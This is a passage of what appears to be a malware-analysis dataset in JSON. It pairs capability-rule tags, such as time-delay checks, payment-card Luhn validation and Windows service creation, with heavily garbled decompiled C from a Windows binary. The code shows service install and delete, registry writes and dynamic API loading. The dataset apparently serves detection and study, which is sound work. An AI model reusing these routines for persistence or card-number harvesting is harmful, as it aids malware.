piVar2 + (-(0x73f0207b < uVar5) - *piVar2);\n                bVar9 = SCARRY1(*pcVar4, pcVar4);\n                *pcVar4 = *pcVar4 + pcVar4;\n                bVar8 = *pcVar4 < '\\0';\n                in_ST0 = in_ST1;\n                in_ST1 = in_ST2;\n                in_ST2 = in_ST3;\n                in_ST3 = in_ST4;\n                in_ST4 = in_ST5;\n                in_ST5 = in_ST6;\n                in_ST6 = in_ST7;\ncode_r0x00401b84:\n                if (bVar9 != bVar8) {\n                    out(0xc4, pcVar4);\n                    *unaff_EDI = pcVar4;\n                    unaff_EDI = unaff_EDI + 1;\n                }\n            }\n            uVar7 = var_10h ^ pcVar4;\n            *((arg_18h - 1) + var_ch) = uVar7;\n            uVar5 = arg_18h;\n            unaff_ESI = arg_8h;\n            uVar3 = var_10h;\n            if ((-1 < uVar7) && (-1 >= uVar7)) {\n                unaff_ESI = arg_8h - 1;\n                pcVar4 = unaff_EDI | &var_1h + 1U;\n                unaff_EDI = pcVar4 + 1;\n                *pcVar4 = arg_18h;\n                uVar3 = 0;\n                uVar5 = arg_18h & 0xffff0000 | arg_18h + (arg_18h >> 8) * 'y';\n            }\n            *(var_ch + uVar5) = uVar3 ^ uVar1;\n            uVar5 = var_8h + 1;\n            var_ch = var_ch + 2;\n            var_8h = uVar5;\n        } while (uVar5 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 1218
    },
    "004023e0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004023f4) overlaps instruction at (ram,0x004023f2)\n// \n\nuint __fastcall fcn.004023e0(int32_t param_1, char param_2, int32_t param_3, int32_t param_4)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *unaff_EDI;\n    bool in_SF;\n    \n    if ((in_SF) || (!in_SF)) {\n        in_EAX = param_4;\n        param_1 = param_3;\n    }\n    *(in_EAX + -0x74f3ba76) = *(in_EAX + -0x74f3ba76) | param_1 >> 8;\n    *unaff_EDI = *unaff_EDI + param_1;\n    *(in_EAX + -0x74f3ba24) = *(in_EAX + -0x74f3ba24) + param_2;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar1);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return uVar2;\n}\n",
        "token_count": 305
    },
    "00402450": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nuint32_t __fastcall fcn.00402450(char param_1)\n\n{\n    char cVar1;\n    uint32_t *in_EAX;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    uint unaff_ESI;\n    uint32_t unaff_EDI;\n    char *pcVar3;\n    bool in_CF;\n    ushort uStack12;\n    ushort uStack10;\n    char *var_4h;\n    \n    uStack12 = unaff_EDI;\n    uStack10 = unaff_EDI >> 0x10;\n    var_4h = NULL;\n    if (!in_CF) {\n        if (in_CF) {\n            if (&uStack12 < *in_EAX || in_EAX == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *(unaff_EBX + 0x516653f8) = *(unaff_EBX + 0x516653f8) + param_1;\n            uStack12 = unaff_ESI >> 0x10;\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n            return unaff_EDI;\n        }\n    }\n    iVar2 = fcn.004048c0(&var_4h);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    if (var_4h == NULL) {\n        return 0;\n    }\n    iVar2 = -1;\n    pcVar3 = var_4h;\n    do {\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071dc, 0x40721c, 1, var_4h, ~iVar2 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 459
    },
    "00402590": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004026b1) overlaps instruction at (ram,0x004026af)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t fcn.00402590(int32_t param_1, int32_t param_2, int32_t param_3, uint32_t param_4)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    uint32_t unaff_EBX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint *puVar8;\n    uchar uVar9;\n    bool bVar10;\n    uint8_t in_AF;\n    uchar uVar11;\n    uint auStack52 [3];\n    ushort uStack40;\n    ushort uStack38;\n    ushort uStack36;\n    ushort uStack34;\n    uint uStack28;\n    uint32_t uStack12;\n    \n    puVar7 = &stack0xffffffe8;\n    uStack12 = 0;\n    uVar6 = param_4;\n    uVar5 = unaff_EBX;\n    uVar3 = param_4;\n    if (0 < param_4) {\n        do {\n            bVar10 = (POPCOUNT(uVar3 & 0xff) & 1U) == 0;\n            if ((bVar10) || (!bVar10)) {\n                uVar5 = uVar5 & 0xffffff00 | *(uStack12 + param_3);\n            }\n            *(uVar5 + 0x1c8a1045) = *(uVar5 + 0x1c8a1045) | 6;\n            uVar3 = uStack12 / param_2;\n            uVar4 = uVar5 ^ *(uStack12 % param_2 + param_1);\n            uVar6 = uVar5 & 0xffffff00 | uVar4;\n            if ((uVar4 != 0) && (uVar4 == 0)) {\n                uVar6 = uVar6 + 1;\n                if (uVar6 == 0) {\n                    uVar4 = uStack12 % param_2;\n                    uVar9 = uVar4 < 0x51;\n                    cVar2 = uVar4 + 0xaf;\n                    uVar11 = cVar2 == '\\0';\n                    bVar10 = (POPCOUNT(cVar2) & 1U) == 0;\n                    uStack36 = 0x3f;\n                    uStack34 = 0xf;\n                    uStack40 = 0;\n                    uStack38 = 0;\n                    auStack52[2] = 0;\n                    auStack52[1] = 0x402679;\n                    auStack52[1] = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n                    if ((!bVar10) && (bVar10)) {\n                        puVar8 = &stack0xffffffd0;\n                        cVar2 = '\\x1e';\n                        do {\n                            puVar7 = puVar7 + -1;\n                            puVar8 = puVar8 + -1;\n                            *puVar8 = *puVar7;\n                            cVar2 = cVar2 + -1;\n                        } while ('\\0' < cVar2);\n                        uVar3 = in(0x78);\n                        return uVar3;\n                    }\n                    uVar3 = 0x4026a1;\n                    fcn.004023e0();\n                    if ((uVar9 || uVar11) || (!uVar9 && !uVar11)) {\n                        uVar3 = uStack12;\n                    }\n                    *(unaff_EBX - 0x75) = *(unaff_EBX - 0x75) - &stack0xffffffc8;\n                    uVar3 = fcn.00403860(auStack52[1], unaff_EBX, uVar3);\n                    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n                    return uVar3;\n                }\n                in_AF = 9 < (uVar3 & 0xf) | in_AF;\n                piVar1 = (uVar3 & 0xffff0000 | CONCAT11((uVar3 >> 8) + in_AF, uVar3 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n                *piVar1 = *piVar1 - uVar6;\n            }\n            uVar5 = uVar6 & 0xffffff00 | uVar4;\n            *(uStack12 + param_3) = param_4 ^ uVar4;\n            uVar6 = uStack12 + 1;\n            uVar3 = uVar6 - param_4;\n            uStack12 = uVar6;\n        } while (uVar6 < param_4);\n    }\n    return uVar6;\n}\n",
        "token_count": 1077
    },
    "00403090": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403258) overlaps instruction at (ram,0x00403254)\n// \n\nvoid fcn.00403090(void)\n\n{\n    char *pcVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint8_t uVar4;\n    ushort extraout_CX;\n    char extraout_CH;\n    ushort extraout_CX_00;\n    ushort uVar5;\n    ushort extraout_CX_01;\n    uint8_t uVar6;\n    int32_t extraout_EDX;\n    int32_t *piVar7;\n    int32_t unaff_EBX;\n    bool bVar8;\n    char cVar9;\n    char cVar10;\n    unkbyte10 extraout_ST0;\n    ulong uVar11;\n    uint uVar12;\n    int32_t iVar13;\n    \n    fcn.00402590();\n    fcn.00402590();\n    fcn.00402590();\n    fcn.00402590();\n    bVar8 = false;\n    iVar13 = 0x411734;\n    uVar11 = fcn.00402590();\n    if (((bVar8) || (!bVar8)) || (iVar3 = unaff_EBX,  uVar5 = extraout_CX,  uVar11 != -0x868126a)) {\n        pcVar1 = (uVar11 >> 0x20) + 0xc;\n        *pcVar1 = *pcVar1 + (extraout_CX >> 8);\n        bVar8 = *pcVar1 < '\\0';\n        uVar12 = 0x411734;\n        fcn.00402590();\n        if ((bVar8) || (!bVar8)) {\n            uVar12 = 0xc;\n        }\n        *(extraout_EDX + 0xc) = *(extraout_EDX + 0xc) + extraout_CH;\n        iVar3 = fcn.00402590(0x411734, uVar12);\n        iVar3 = (unaff_EBX ^ 0x70c5) - iVar3;\n        uVar5 = extraout_CX_00;\n        iVar13 = unaff_EBX;\n    }\n    uVar6 = iVar3 >> 8 | uVar5 >> 8;\n    uVar4 = uVar5;\n    cVar10 = SBORROW1(uVar6, uVar4);\n    cVar9 = uVar6 - uVar4 < '\\0';\n    bVar8 = uVar6 == uVar4;\n    uVar11 = fcn.00402590();\n    iVar3 = uVar11 >> 0x20;\n    uVar6 = extraout_CX_01 >> 8;\n    if ((!bVar8 && cVar10 == cVar9) && (bVar8 || cVar10 != cVar9)) {\n        iVar13 = iVar13 + 1;\n        puVar2 = uVar11 + 0x6a39da56;\n        *puVar2 = *puVar2 ^ extraout_CX_01;\n        puVar2 = uVar11 + 0x34;\n        *puVar2 = *puVar2 | uVar6;\n        if (*puVar2 == 0) {\n            pcVar1 = iVar3 + 0xc;\n            *pcVar1 = *pcVar1 + uVar6;\n            goto code_r0x00403239;\n        }\n    }\n    pcVar1 = iVar3 + 0xc;\n    *pcVar1 = *pcVar1 + uVar6;\n    fcn.00402590(0x411734);\n    fcn.00402590(0x411734, 0xc, 0x40743c, 8);\ncode_r0x00403239:\n    uVar11 = fcn.00402590();\n    piVar7 = uVar11 >> 0x20;\n    *(uVar11 + -0x7ce92414) = extraout_ST0;\n    *piVar7 = *piVar7 + 0x76adf84;\n    fcn.00402590(0x411734, 0xc, 0x40744c, iVar13);\n    fcn.00402590();\n    fcn.00402590();\n    fcn.00402590();\n    fcn.00402590(0x411734, 0xc, 0x40748c, 8);\n    return;\n}\n",
        "token_count": 975
    },
    "00403580": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004035da) overlaps instruction at (ram,0x004035d5)\n// \n\nuint fcn.00403580(uint *param_1, int32_t param_2)\n\n{\n    uint8_t *puVar1;\n    uint *arg_8h;\n    uint *puVar2;\n    uint *extraout_ECX;\n    uint8_t unaff_BL;\n    bool bVar3;\n    uint *arg_10h;\n    uint *arg_14h;\n    \n    arg_8h = param_1;\n    puVar2 = fcn.00404410(param_1, param_2, &param_1, &param_2);\n    if (puVar2 == NULL) {\n        return 0;\n    }\n    bVar3 = (POPCOUNT((unaff_BL | puVar2 >> 8) & 0x94f) & 1U) != 0;\n    puVar2[0x16] = param_2;\n    if (bVar3) {\n        arg_10h = extraout_ECX;\n        arg_14h = arg_8h;\n        if (!bVar3) goto code_r0x004035cd;\n    }\n    puVar2 = &param_2;\n    arg_10h = &param_1;\n    arg_14h = puVar2;\ncode_r0x004035cd:\n    puVar1 = (param_2 + 1U | 0x8d) + 0x51;\n    *puVar1 = *puVar1 | puVar2;\n    fcn.00404410(arg_8h, 0x34a96cf4, arg_10h, arg_14h);\n    return 1;\n}\n",
        "token_count": 386
    },
    "00403860": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403860(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 138
    },
    "00403a20": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403a8a) overlaps instruction at (ram,0x00403a88)\n// \n\nuint fcn.00403a20(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    char cVar7;\n    uint32_t extraout_ECX;\n    int32_t iVar8;\n    int32_t unaff_EBX;\n    code *pcVar9;\n    uint8_t in_AF;\n    ulong uVar10;\n    \n    uVar10 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x407108);\n    pcVar9 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    iVar8 = uVar10 >> 0x20;\n    iVar4 = uVar10;\n    if (iVar4 == 0) {\n        return 0;\n    }\n    if ((iVar4 < 0) || (iVar4 >= 0)) {\n        *0x42376c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar4, 0x407118);\n    }\n    else {\n        uVar5 = iVar8 + 1;\n        pcVar1 = iVar8 + 0x19;\n        cVar2 = *pcVar1;\n        cVar7 = extraout_ECX >> 8;\n        *pcVar1 = *pcVar1 + cVar7;\n        if (!SCARRY1(cVar2, cVar7)) {\n            pe_dos_header = in(uVar10);\n            in_AF = 9 < (uVar5 & 0xf) | in_AF;\n            uVar3 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n            uVar6 = uVar5 & 0xffff0000 | uVar3;\n            *(unaff_EBX + 0x423774) = *(unaff_EBX + 0x423774) + (uVar3 >> 8);\n            uVar5 = extraout_ECX;\n            goto code_r0x00403a93;\n        }\n        *(iVar4 + -1) = *(iVar4 + -1) + uVar10;\n        *0x42376c = uVar5 & 0xffffff00 | *(unaff_EBX + (uVar5 & 0xff));\n        pcVar9 = NULL;\n    }\n    *0x423770 = (*pcVar9)(iVar4, 0x407134);\n    uVar6 = (*pcVar9)(iVar4, 0x407144);\n    uVar5 = *0x42376c;\n    *0x423774 = uVar6;\ncode_r0x00403a93:\n    if (((uVar5 != 0) && (*0x423770 != 0)) && (uVar6 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 664
    },
    "00404b40": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404b19) overlaps instruction at (ram,0x00404b16)\n// \n// WARNING: Removing unreachable block (ram,0x00404c09)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint * __cdecl fcn.00404b40(uchar *noname_0, uint noname_1, uint noname_2, uint noname_3, uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint16_t in_AX;\n    uint *puVar4;\n    ushort uVar5;\n    uint32_t in_ECX;\n    uint8_t uVar6;\n    uint32_t in_EDX;\n    uint unaff_EBX;\n    uchar **ppuVar7;\n    uchar **unaff_EBP;\n    int32_t iVar10;\n    uchar *unaff_ESI;\n    int32_t unaff_EDI;\n    ushort in_SS;\n    bool bVar11;\n    uint8_t in_AF;\n    uchar in_ZF;\n    uint *var_128h;\n    uint uStack24;\n    ushort uStack20;\n    ushort uStack18;\n    ushort uStack16;\n    ushort uStack14;\n    uint *var_8h;\n    uint var_4h;\n    uchar *puStack4;\n    uchar **ppuVar8;\n    uchar **ppuVar9;\n    \n    do {\n        puStack4 = unaff_EBP;\n        ppuVar7 = &puStack4;\n        ppuVar8 = &puStack4;\n        ppuVar9 = &puStack4;\n        uStack14 = unaff_EDI >> 0x10;\n        uVar3 = in_AX;\n        if (!in_ZF) {\n            uVar5 = in_ECX;\n            in_ECX = (in_ECX >> 8 & 0xffff00) << 8 | in_ECX & 0xffff;\n            if (!in_ZF) goto code_r0x00404b57;\n            unaff_EDI = CONCAT22(uVar5, in_SS);\n            uStack20 = 0x47;\n            uStack18 = 0;\n            uVar6 = in_EDX >> 8 | uVar3;\n            in_EDX = CONCAT11(uVar6, in_EDX);\n            bVar11 = (POPCOUNT(uVar6) & 1U) == 0;\n            if (uVar6 < '\\x01') goto code_r0x00404b5e;\ncode_r0x00404baa:\n            if (bVar11) {\n                puVar4 = &uStack20;\n                cVar2 = '\\x1e';\n                do {\n                    ppuVar7 = ppuVar7 + -1;\n                    puVar4 = puVar4 + -1;\n                    *puVar4 = *ppuVar7;\n                    cVar2 = cVar2 + -1;\n                } while ('\\0' < cVar2);\n                puVar4 = in(0x78);\n                return puVar4;\n            }\ncode_r0x00404bc4:\n            unaff_ESI[4] = 0xe2;\n            unaff_ESI[5] = 0x28;\n            bVar11 = (POPCOUNT(in_ECX + 1U & 0xc9) & 1U) == 0;\n            unaff_ESI[6] = 0x25;\n            unaff_ESI[7] = 0xf0;\n            if ((!bVar11) && (bVar11)) {\n                puVar4 = &uStack20;\n                cVar2 = '\\x1e';\n                do {\n                    ppuVar8 = ppuVar8 + -1;\n                    puVar4 = puVar4 + -1;\n                    *puVar4 = *ppuVar8;\n                    cVar2 = cVar2 + -1;\n                } while ('\\0' < cVar2);\n                puVar4 = in(0x78);\n                return puVar4;\n            }\n            unaff_ESI[8] = 0xbc;\n            if ((!bVar11) && (bVar11)) {\n                puVar4 = &uStack20;\n                cVar2 = '\\x1e';\n                do {\n                    ppuVar9 = ppuVar9 + -1;\n                    puVar4 = puVar4 + -1;\n                    *puVar4 = *ppuVar9;\n                    cVar2 = cVar2 + -1;\n                } while ('\\0' < cVar2);\n                puVar4 = in(0x78);\n                return puVar4;\n            }\n            unaff_ESI[9] = 0x7e;\n            if ((bVar11) || (!bVar11)) {\n                unaff_ESI[10] = 0xb7;\n            }\n            iVar10 = *0xc617b43a;\n            *0x34a96d00 = 0xbf;\n            iVar1 = *(iVar10 + 8);\n            *(iVar1 + 0xc) = 2;\n            *(iVar1 + 0xd) = 0xd4;\n            *(iVar1 + 0xe) = 0x79;\n            puVar4 = *(iVar10 + 0xc);\n            *puVar4 = 0xf;\n            return puVar4;\n        }\ncode_r0x00404b57:\n        *noname_0 = 0x7f;\n        uStack20 = in_ECX;\n        uStack18 = in_ECX >> 0x10;\n        unaff_ESI = noname_0;\ncode_r0x00404b5e:\n        uVar6 = in_EDX ^ unaff_EBX >> 8 | 0x67;\n        in_ZF = uVar6 == 0;\n        in_EDX = in_EDX & 0xffff;\n        in_ECX = CONCAT22(uStack18, uStack20);\n        unaff_ESI[1] = 0x21;\n        if ((uVar6 < '\\x01') || ('\\0' < uVar6)) {\n            unaff_ESI[2] = 0x87;\n            bVar11 = (POPCOUNT(in_AX & 0xcb) & 1U) == 0;\n            unaff_ESI[3] = 0xa0;\n            if (bVar11) goto code_r0x00404bc4;\n            goto code_r0x00404baa;\n        }\n        in_AF = 9 < (uVar3 & 0xf) | in_AF;\n        in_AX = uVar3 + in_AF * '\\x06' & 0xff0f;\n        if (in_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        unaff_EBP = &puStack4;\n        if (!in_ZF) {\n            *(unaff_EDI + 0x66) = '\\0';\n            if (*(unaff_EDI + 0x66) == '\\0') {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            var_8h = var_128h;\n            uStack18 = unaff_EBX;\n            uStack16 = unaff_EBX >> 0x10;\n            uStack20 = 0x40;\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            return var_8h;\n        }\n    } while( true );\n}\n",
        "token_count": 1663
    },
    "00404e20": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404e7b) overlaps instruction at (ram,0x00404e78)\n// \n\nbool __cdecl fcn.00404e20(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    char in_DL;\n    uint *puVar3;\n    bool bVar4;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    bVar4 = SBORROW1(in_DL, 'Q');\n    fcn.00402520();\n    if ((!bVar4) && (bVar4)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(*0x10 + -0x110, 4);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00401000();\n        arg_ch_01 = fcn.00401000();\n        arg_ch_02 = fcn.00401000();\n        fcn.00402280(arg_10h, arg_ch_00);\n        fcn.00402280(arg_8h, arg_ch_01);\n        fcn.00402280(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x407028, &lpBuffer, arg_10h);\n        iVar2 = fcn.00403df0(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x407034, &lpBuffer, arg_8h);\n            iVar2 = fcn.00403df0(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x407034, &lpBuffer, arg_ch);\n                iVar2 = fcn.00403df0(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00402280(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 705
    },
    "00404f80": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00404f80(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00404730(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 53
    },
    "00401040": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401040(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 102
    },
    "00401180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004011b4) overlaps instruction at (ram,0x004011b3)\n// \n// WARNING: Removing unreachable block (ram,0x004011ba)\n// WARNING: Removing unreachable block (ram,0x004011c4)\n\nint32_t fcn.00401180(uint32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    ushort uVar3;\n    uint *unaff_EDI;\n    uint32_t uVar4;\n    bool bVar5;\n    unkbyte6 Var6;\n    \n    Var6 = (*_sym.imp.MSVCRT.dll__strlwr)();\n    uVar3 = Var6 >> 0x20;\n    uVar4 = Var6;\n    bVar5 = *0x10 == 0x24;\n    if ((bVar5) || (!bVar5)) {\n        if ((&stack0xffffffd8 < 0xfffffffc && !bVar5) && (&stack0xffffffd8 >= 0xfffffffc || bVar5)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        uVar4 = 0;\n        do {\n            iVar2 = (*_sym.imp.MSVCRT.dll_strstr)(param_1);\n            if (iVar2 != 0) {\n                return 1;\n            }\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < 5);\n    }\n    else {\n        uVar1 = in(uVar3);\n        *unaff_EDI = uVar1;\n        if (&stack0xffffffdc < 1) goto code_r0x0040121e;\n        param_1 = param_1 & 0xffff0000 |\n                  CONCAT11(param_1 >> 8 ^ (uVar4 ^ 0xdee0ed6d) + ((uVar4 ^ 0xdee0ed6d) >> 8) * -0x31, param_1);\n        in(uVar3);\n        *0x87ae672 = *0x87ae672 + 1;\n    }\n    iVar2 = (*_sym.imp.MSVCRT.dll_strstr)(param_1);\n    uVar4 = -(iVar2 != 0);\ncode_r0x0040121e:\n    return uVar4 + 1;\n}\n",
        "token_count": 519
    },
    "00402280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004022b7) overlaps instruction at (ram,0x004022b4)\n// \n\nvoid __cdecl fcn.00402280(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint8_t uVar2;\n    uint32_t in_EDX;\n    uint32_t uVar3;\n    char cVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    \n    uVar3 = in_EDX & 0xffff;\n    uVar5 = 0;\n    bVar6 = false;\n    if (arg_ch != 0) {\n        do {\n            if ((bVar6) || (!bVar6)) {\n                iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n                in_ECX = 0x1a;\n                uVar3 = iVar1 % 0x1a;\n            }\n            else {\n                arg_ch = arg_ch ^ *(arg_ch + 0xe58be73);\n                cVar4 = &stack0xf415ff72;\n                *(in_ECX + 0x1ab9) = *(in_ECX + 0x1ab9) + cVar4;\n                arg_8h = &stack0xf415ff72 & 0xffff0000 | CONCAT11((&stack0xf415ff72 >> 8) + (uVar3 >> 8), cVar4);\n            }\n            uVar2 = uVar3 + 0x61;\n            uVar3 = uVar3 & 0xffffff00 | uVar2;\n            *(uVar5 + arg_8h) = uVar2;\n            uVar5 = uVar5 + 1;\n            bVar6 = uVar5 < arg_ch;\n        } while (bVar6);\n    }\n    return;\n}\n",
        "token_count": 411
    },
    "00402520": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nuint32_t __fastcall fcn.00402520(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    bool in_CF;\n    bool in_ZF;\n    bool in_OF;\n    \n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        if (!in_OF) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071dc, 0x40721c, 1, param_2);\n        return iVar1 == 0;\n    }\n    uVar3 = *0x423768;\n    if (*0x423768 == 0) {\n        uVar2 = (*_sym.imp.MSVCRT.dll_time)(0);\n        uVar3 = (*_sym.imp.MSVCRT.dll_srand)(uVar2);\n        *0x423768 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 255
    },
    "004037f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403806) overlaps instruction at (ram,0x00403803)\n// \n\nuint __cdecl fcn.004037f0(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0);\n    uVar1 = fcn.00403d40(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 126
    },
    "00404ce0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
